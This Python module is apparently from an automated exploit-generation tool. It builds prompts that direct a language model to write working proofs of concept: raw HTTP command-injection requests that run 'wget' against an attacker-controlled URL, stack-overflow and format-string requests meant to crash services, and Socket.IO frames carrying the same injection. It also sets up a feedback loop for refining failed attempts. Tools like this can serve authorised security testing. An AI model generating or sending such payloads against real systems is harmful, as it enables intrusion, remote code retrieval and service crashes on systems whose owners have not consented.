from __future__ import annotations

from typing import List, Optional

from PoCGen.llm.client import ChatMessage
from PoCGen.config.config import SETTINGS


def _build_http_system_prompt(attacker_url: str) -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a command injection vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        f"Objective: use a command-injection payload that fetches 'testpoc' from the attacker host '{attacker_url}' via wget. The attacker URL represents the file retrieval location; infer the vulnerable parameter and request structure from the provided code and description.\n"
        "\n"
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length) before responding.\n"
        "\n"
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "  1) Infer method/path, body format, and vulnerable parameter from code/sample.\n"
        "  2) Craft the minimal injection payload to wget the attacker URL, matching encoding and delimiters.\n"
        "  3) Assemble headers/body, then recompute accurate Content-Length.\n"
        "\n"
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, encoding style (JSON, form-urlencoded, plaintext, multipart), and payload syntax from the vulnerable code before adjusting headers or ancillary metadata. Mirror any command-injection delimiters such as '$(...)', '$(+ ...)', ';', '&&', or backticks that the backend recognizes.\n"
        "\n"
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly. Only fall back to POST with 'application/x-www-form-urlencoded; charset=UTF-8' when the handler's expectations are unknown.\n"
        "- Include realistic headers similar to: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port, and mirror it in Origin/Referer.\n"
        f"- Body should contain a minimal injection payload using separators like '`' or ';' to trigger command execution, referencing a plausible vulnerable parameter. The payload's purpose is to run 'wget {attacker_url}'.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content (including any trailing newline if present). Do not guess.\n"
        f"- IMPORTANT: The attacker URL in the body MUST be plaintext (NOT percent-encoded). Do NOT URL-encode the '{attacker_url}' or the separators ';'/'&&'. If credentials/cookies are needed, include a realistic placeholder cookie, e.g., 'Cookie: Authorization=REPLACE_ME'.\n"
        "\n"
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "  POST /path/to/vuln HTTP/1.1\n"
        "  Host: <HOST>\n"
        "  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "  Accept: application/json, text/javascript, */*; q=0.01\n"
        "  Accept-Language: en-US,en;q=0.5\n"
        "  Accept-Encoding: gzip, deflate, br\n"
        "  Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "  X-Requested-With: XMLHttpRequest\n"
        "  Content-Length: <LEN>\n"
        "  Origin: http://<HOST>\n"
        "  Connection: keep-alive\n"
        "  Referer: http://<HOST>/\n"
        "  Cookie: <COOKIE_IF_NEEDED>\n"
        "  \n"
        "  <BODY_WITH_INJECTION>\n"
    )


def _build_http_overflow_prompt() -> str:
    return (
        "You are a security researcher generating ONE raw HTTP request PoC for a stack-based buffer overflow vulnerability.\n"
        "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
        "Objective: Use a buffer-overflow payload that causes the target service to crash or return a 5xx HTTP error.\n"
        "Infer the vulnerable parameter and request structure from the provided code and description.\n\n"
        
        "Blueprint handling:\n"
        "- If a sample HTTP interaction is provided, treat it as the primary blueprint—mirror its method, path, critical headers, parameter naming, and encoding, only changing what is necessary to deliver the payload.\n"
        "- If validation feedback from previous attempts is provided, you MUST fix the highlighted issues (e.g., wrong parameter, missing cookie, incorrect length, incorrect payload structure) before responding.\n\n"
        
        "Silent chain-of-thought (keep internal; final output is ONLY the raw HTTP request):\n"
        "1) Infer method/path, body format, and vulnerable parameter from code/sample. Identify parameters that accept user input.\n"
        "2) Craft a buffer overflow payload that will likely crash the service. This could be:\n"
        "   - A very long string (e.g., 1000+ 'A' characters)\n"
        "   - A format string payload (e.g., %s%n%s%n...)\n"
        "   - Carefully crafted binary data\n"
        "   - An integer overflow payload\n"
        "3) Assemble headers/body, ensuring the payload fits the expected data format, then recompute the exact Content-Length.\n\n"
        
        "Refinement guidance after a failure: revisit the BODY format first—match parameter names, required fields, and the exact encoding style (JSON string, form-urlencoded, plaintext, multipart, hex-encoded binary). The overflow payload must be formatted correctly for the vulnerable handler.\n\n"
        
        "Hard constraints (follow strictly):\n"
        "- Output MUST be exactly one HTTP request, no explanations, no extra lines, no markdown, no code fences.\n"
        "- The single request MUST include both headers and body (data).\n"
        "- Derive the HTTP method and media type from the sample or code. If JSON, send a compact JSON body with the payload as a string value; if form data, keep it URL-encoded; if plaintext or multipart, follow that format exactly.\n"
        "- Include realistic headers: User-Agent, Accept, Accept-Language, Accept-Encoding, Content-Type, X-Requested-With, Origin, Connection, Referer, Cookie (if applicable).\n"
        "- Host header must reflect the known target; if unknown, use 'Host: TARGET'. If a Target Hint is provided, use its host:port.\n"
        "- Body should contain a buffer overflow payload designed to crash the service or trigger a 5xx error.\n"
        "- Content-Length MUST be the exact UTF-8 byte length of the body. Determine it AFTER finalizing the exact body content.\n"
        "- IMPORTANT: The overflow payload (e.g., long string, format string, binary data) must be placed in the correct vulnerable parameter.\n\n"
        
        "Success indicators we're looking for:\n"
        "- HTTP 5xx status codes (500, 503, etc.) - server internal error\n"
        "- Connection errors (connection refused, timeout, reset) - service may have crashed\n\n"
        
        "Fallback structure if no sample interaction is available (adjust as needed):\n"
        "POST /path/to/vuln HTTP/1.1\n"
        "Host: <HOST>\n"
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\n"
        "Accept: application/json, text/javascript, */*; q=0.01\n"
        "Accept-Language: en-US,en;q=0.5\n"
        "Accept-Encoding: gzip, deflate, br\n"
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        "X-Requested-With: XMLHttpRequest\n"
        "Content-Length: <LEN>\n"
        "Origin: http://<HOST>\n"
        "Connection: keep-alive\n"
        "Referer: http://<HOST>/\n"
        "Cookie: <COOKIE_IF_NEEDED>\n\n"
        "<PARAMETER_NAME>=<BUFFER_OVERFLOW_PAYLOAD>\n"
    )


def _build_user_context(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    target_profile: str | None,
    validation_feedback: str | None,
) -> str:
    user_parts: List[str] = []
    user_parts.append("Vulnerability Description:\n" + description.strip())
    if target:
        user_parts.append(f"Target Hint: {target}")
    if target_profile:
        user_parts.append(target_profile)
    if validation_feedback:
        user_parts.append(
            "Previous attempt feedback (use this to refine the next request):\n" + validation_feedback.strip()
        )
    for idx, content in enumerate(code_files, start=1):
        user_parts.append(f"--- Code File #{idx} ---\n{content}")
    return "\n\n".join(user_parts)


def build_prompt_command_injection_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    atk = attacker_url or SETTINGS.attacker_url
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_system_prompt(atk)),
        ChatMessage(role="user", content=user),
    ]


def build_prompt_stack_overflow_http(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_http_overflow_prompt()),
        ChatMessage(role="user", content=user),
    ]


def _build_socket_system_prompt(attacker_url: str) -> str:
    return (
        "You are a security researcher crafting EXACTLY ONE Socket.IO exploit payload for a command injection vulnerability.\n"
        "You must output a SINGLE JSON object (no markdown, no comments) that conforms to the following schema: \n"
        '{"path": str, "frame": str, "namespace": str|null, "headers": {str:str}, "cookies": str|null, "wait_for_response": bool, "max_response_frames": int}.\n'
        "Purpose: leverage a Socket.IO text frame to run 'wget {attacker_url}' on the target device. Mirrors from supplied code/description.\n"
        "Instructions:\n"
        "- Infer the Socket.IO endpoint path (include query like ?transport=websocket&EIO=4) and namespace directly from the provided code blueprint.\n"
        "- Output ONLY the path (not full URL) plus the 'frame' string; the sender will combine it with the target host.\n"
        "- Populate headers/cookies only if clearly required (e.g., cookies from target sampling).\n"
        "- The 'frame' MUST be a Socket.IO text frame string starting with '42[...]' and include the event name plus payload.\n"
        "- The payload in the frame MUST mirror the server's expected JSON/formats (arrays, dicts, plain strings). Include ONLY minimal fields plus the injection expression that executes wget {attacker_url}.\n"
        "- Use true/false for wait_for_response and set max_response_frames to a small positive integer (default 1).\n"
        "- Do NOT include explanations or extra keys outside the schema. Output must be valid JSON and UTF-8 clean.\n"
        "- Command payload must keep delimiters such as ';', '&&', '$(...)' unencoded, and should not URL-encode the attacker URL.\n"
    )


def build_prompt_command_injection_socket(
    *,
    description: str,
    code_files: List[str],
    target: str | None,
    attacker_url: Optional[str] = None,
    target_profile: str | None = None,
    validation_feedback: str | None = None,
) -> List[ChatMessage]:
    atk = attacker_url or SETTINGS.attacker_url
    user = _build_user_context(
        description=description,
        code_files=code_files,
        target=target,
        target_profile=target_profile,
        validation_feedback=validation_feedback,
    )
    return [
        ChatMessage(role="system", content=_build_socket_system_prompt(atk)),
        ChatMessage(role="user", content=user),
    ]


__all__ = [
    "build_prompt_command_injection_http",
    "build_prompt_command_injection_socket",
    "build_prompt_stack_overflow_http",
]